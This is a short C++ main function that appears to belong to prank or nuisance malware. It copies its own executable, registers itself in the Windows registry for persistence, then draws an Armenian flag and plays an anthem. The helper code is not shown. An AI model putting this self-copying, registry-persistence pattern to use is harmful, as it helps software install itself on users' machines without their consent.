#include "Audio.h"
#include "Draw.h"
#include "Startup.h"
int main(int argc, char* argv[])
{
    Startup::copyFile(argv[0]);
    Startup::addToRegistry(argv[0]);
    Draw::drawArmenianFlag();
	Audio::playAmrnianAnthem();
	return 0;
}
